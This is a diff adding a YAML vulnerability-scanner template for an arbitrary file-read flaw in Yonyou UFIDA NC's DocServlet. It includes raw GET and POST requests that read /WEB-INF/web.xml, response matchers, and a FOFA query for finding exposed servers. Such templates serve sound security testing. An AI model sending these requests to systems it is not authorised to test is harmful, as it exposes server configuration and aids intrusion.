@@ -1,0 +1,46 @@
+id: yonyou-nc-DocServlet-fileread
+info:
+  name: 用友 UFIDA NC nc.uap.lfw.file.action.DocServlet - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - https://github.com/szjr123/Target-practice/blob/05ed667090d8040a09235826f7698ff5347a93cf/%E7%94%A8%E5%8F%8BOA/NC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96_DocServlet/yongyou_read.py
+  metadata:
+    verified: true
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,fileread,oa
+
+http:
+  - raw:
+      - |+
+        GET /servlet/~webrt/nc.uap.lfw.file.action.DocServlet?disp=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 0
+
+    matchers:
+      - type: dsl
+        name: servlet_endpoint
+        dsl:
+          - "contains_all(body, 'nc.bs.framework.server.WebApplicationStartupHook','nc.bs.framework.server.LoggerServletFilte') && status_code==200 && contains(header,'application/xml')"
+  - raw:
+      - |
+        POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageId=login&disp=/WEB-INF/web.xml
+
+    matchers:
+      - type: dsl  
+        name: service_endpoint
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/xml")'
+          - 'contains_all(body, "<web-app", "<?xml version")'
+        condition: and
+
